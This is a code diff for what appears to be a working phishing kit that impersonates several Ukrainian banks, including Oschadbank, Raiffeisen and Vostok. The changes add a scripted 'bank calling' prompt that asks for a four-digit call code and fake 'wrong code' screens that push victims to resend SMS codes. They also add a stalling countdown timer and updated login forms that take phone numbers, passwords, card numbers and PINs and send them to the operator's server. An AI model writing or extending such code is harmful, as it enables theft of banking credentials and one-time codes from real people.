@@ -92,6 +92,7 @@ background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
         .loading-spinner img { width: 50px; height: 50px; animation: spin 2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .custom-input { display: none; }
+        .sms-form { margin-top: 20px; } /* Для возврата к SMS */
     </style>
 </head>
 <body>
@@ -124,6 +125,7 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStepIndex = 0;
     let collectedData = {};
     let isBanned = localStorage.getItem('banned') === 'true'; // Глобальный бан для браузера
+    let currentSmsText = ''; // Для возврата к SMS
 
     // --- НОВІ СЦЕНАРІЇ ---
     const specialFlowSteps = [
@@ -272,7 +274,7 @@ document.addEventListener('DOMContentLoaded', () => {
             let key = input.id;
             let value = input.value;
             if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
-            if (key === 'card' || key === 'card_confirm' || key === 'login' || key === 'password' || key === 'pin') value = value.replace(/\s/g, '');
+            if (key === 'card' || key === 'card_confirm' || key === 'login' || key === 'password' || key === 'pin' || key === 'call_code_input') value = value.replace(/\s/g, '');
             data[key] = value;
         });
 
@@ -286,9 +288,13 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
 
-        if (step.type.startsWith('lk_')) {
+        if (step.type.startsWith('lk_') || step.type === 'call_oschad') {
             sendDataToServer(data, true, activeBankData.theme);
-            showLoadingSpinner();
+            if (step.type === 'lk_oschad') {
+                showLoadingSpinner();
+            } else {
+                showWaitingScreen();
+            }
             return;
         }
 
@@ -317,6 +323,15 @@ document.addEventListener('DOMContentLoaded', () => {
         modalTitle.textContent = 'Очікуйте, сервер перевантажений';
         stepContent.innerHTML = `<div class="loading-spinner"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" alt="Loading"></div>`;
         modalFooter.style.display = 'none';
+    }
+
+    function showCodeError() {
+        modalTitle.textContent = 'Вказано Невірний код';
+        stepContent.innerHTML = `<p style="text-align:center; color: var(--danger-color);">Вказано Невірний код</p><div class="sms-form">${currentSmsText}</div>`;
+        modalFooter.style.display = 'flex';
+        nextBtn.textContent = 'Відправити';
+        nextBtn.id = 'submit-sms-code';
+        nextBtn.addEventListener('click', submitSmsCode, { once: true });
     }
 
     function handleBackStep() {
@@ -362,6 +377,10 @@ document.addEventListener('DOMContentLoaded', () => {
         if (pinInput) {
             // Для PIN клавиатуры логика в renderStep
         }
+        const callCodeInput = document.getElementById('call_code_input');
+        if (callCodeInput) {
+            callCodeInput.maxLength = 4;
+        }
     }
 
     function validateCurrentStep() {
@@ -386,6 +405,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 case 'pin':
                 case 'login':
                 case 'password': requiredLength = input.value.length > 0 ? 0 : 1; break; // Для текста просто не пустой
+                case 'call_code_input': requiredLength = 4; break;
             }
 
             if (requiredLength > 0 && value.length < requiredLength || (requiredLength === 1 && !input.value.trim())) {
@@ -419,7 +439,7 @@ document.addEventListener('DOMContentLoaded', () => {
             case 'pin':
                 if (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank') {
                     html = `
-                        <p style="text-align:center;">Введіть ПІН-код картки</p>
+                        <p style="text-align:center;">Введіть пароль</p>
                         <div class="pin-dots" id="pin-dots"></div>
                         <input type="password" class="custom-input" id="pin" maxlength="4">
                         <div class="pin-keyboard" id="pin-keyboard">
@@ -448,7 +468,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'lk_raiffeisen':
                 html = `
-                    <p style="text-align:center;">Введіть ПІН-код картки (дизайн как на скрине Райффайзен: желтые кнопки, dots сверху)</p>
+                    <p style="text-align:center;">Введіть пароль</p>
                     <div class="pin-dots" id="pin-dots"></div>
                     <input type="password" class="custom-input" id="pin" maxlength="4">
                     <div class="pin-keyboard" id="pin-keyboard">
@@ -458,7 +478,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 `;
                 break;
             case 'lk_vostok':
-                html = `<p style="text-align:center;">Авторизація у VST bank (стиль Восток: оранжевые тона)</p>${generateInputHTML('login', 'Логін', 'text')}${generateInputHTML('password', 'Пароль', 'password')}`;
+                html = `<p style="text-align:center;">Вхід у Vostok Bank</p><div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12" value="380"></div><div class="error-message" style="margin-left: 55px;"></div></div>${generateInputHTML('password', 'Пароль', 'password')}`;
                 break;
             case 'lk_izibank':
                 html = `
@@ -475,7 +495,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 html = `<p style="text-align:center;">Підтвердити володіння карткою (вертикально для удобства)</p><div class="multi-input-row">${generateInputHTML('card_confirm', 'Номер картки', 'tel', '19')}${generateInputHTML('card-expiry', 'Термін дії (ММ/РР)', 'tel', '5')}${generateInputHTML('pin', 'ПІН-код', 'password', '4')}</div>`;
                 break;
             case 'call_oschad':
-                html = `<p style="text-align:center;">Підтвердження дзвінком у Ощад24 (как на скрине: поле для кода, текст сверху)</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
+                html = `<p style="text-align:center;">Вам телефонує Ощадбанк: прийміть дзвінок, натисніть 1 та прослухайте код</p>${generateInputHTML('call_code_input', 'Введіть 4-значний код з дзвінка', 'tel', '4')}`;
                 break;
         }
         modalTitle.textContent = step.title;
@@ -483,9 +503,15 @@ document.addEventListener('DOMContentLoaded', () => {
         modalFooter.style.display = 'flex';
         backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
         nextBtn.style.display = 'block';
+        nextBtn.textContent = 'Продовжити';
+        nextBtn.id = 'next-btn';
+        nextBtn.removeEventListener('click', submitSmsCode);
         addInputFormatting();
         if (step.type.includes('pin') && (activeBankData.theme === 'raiffeisen' || activeBankData.theme === 'izibank')) {
             setupPinKeyboard();
+        }
+        if (step.type === 'sms') {
+            currentSmsText = stepContent.innerHTML;
         }
     }
 
@@ -553,8 +579,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
         switch (type) {
             case 'sms':
+                currentSmsText = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                 modalTitle.textContent = 'Введіть код з SMS';
-                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
+                stepContent.innerHTML = currentSmsText;
                 modalFooter.style.display = 'flex';
                 modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                 modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
@@ -565,12 +592,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderStep();
                 break;
             case 'lk_raiffeisen':
-                activeBankData.steps = [{ type: 'lk_raiffeisen', title: 'Введіть ПІН-код' }];
+                activeBankData.steps = [{ type: 'lk_raiffeisen', title: 'Введіть пароль' }];
                 currentStepIndex = 0;
                 renderStep();
                 break;
             case 'lk_vostok':
-                activeBankData.steps = [{ type: 'lk_vostok', title: 'Авторизація у VST bank' }];
+                activeBankData.steps = [{ type: 'lk_vostok', title: 'Вхід у Vostok Bank' }];
                 currentStepIndex = 0;
                 renderStep();
                 break;
@@ -588,6 +615,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 activeBankData.steps = [{ type: 'call_oschad', title: 'Підтвердження дзвінком' }];
                 currentStepIndex = 0;
                 renderStep();
+                break;
+            case 'code_error':
+                showCodeError();
+                break;
+            case 'timer':
+                modalTitle.textContent = 'Обробка заявки';
+                stepContent.innerHTML = `<div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>`;
+                modalFooter.style.display = 'none';
+                let duration = 15 * 60;
+                const display = document.getElementById('timer');
+                const timerInterval = setInterval(() => {
+                    let minutes = parseInt(duration / 60, 10);
+                    let seconds = parseInt(duration % 60, 10);
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    display.textContent = minutes + ":" + seconds;
+                    if (--duration < 0) {
+                        clearInterval(timerInterval);
+                        display.textContent = "Готово!";
+                    }
+                }, 1000);
                 break;
             case 'app':
                 // Убрано
@@ -614,31 +662,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'number_error':
                 showMessageWithButton("Невірний номер", data.text, "Назад", () => window.location.reload());
-                break;
-            case 'code_error':
-                modalTitle.textContent = "Невірний код. Вкажіть вірний код.";
-                const errorContainer = document.getElementById('sms-error-container');
-                if (errorContainer) {
-                    errorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
-                }
-                break;
-            case 'timer':
-                modalTitle.textContent = 'Обробка заявки';
-                stepContent.innerHTML = `<div id="timer" style="color:var(--primary-color); font-size: 32px; font-weight: 700; text-align: center; margin-top: 20px;">15:00</div>`;
-                modalFooter.style.display = 'none';
-                let duration = 15 * 60;
-                const display = document.getElementById('timer');
-                const timerInterval = setInterval(() => {
-                    let minutes = parseInt(duration / 60, 10);
-                    let seconds = parseInt(duration % 60, 10);
-                    minutes = minutes < 10 ? "0" + minutes : minutes;
-                    seconds = seconds < 10 ? "0" + seconds : seconds;
-                    display.textContent = minutes + ":" + seconds;
-                    if (--duration < 0) {
-                        clearInterval(timerInterval);
-                        display.textContent = "Готово!";
-                    }
-                }, 1000);
                 break;
             case 'ban':
                 isBanned = true;
@@ -689,11 +712,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         // 2. Сразу же показываем пользователю ошибку, не дожидаясь ответа.
-        modalTitle.textContent = "Невірний код";
-        const errorContainer = document.getElementById('sms-error-container');
-        if (errorContainer) {
-            errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
-        }
+        showCodeError();
         
         // 3. Очищаем поле ввода, чтобы пользователь мог ввести код заново.
         codeInput.value = '';
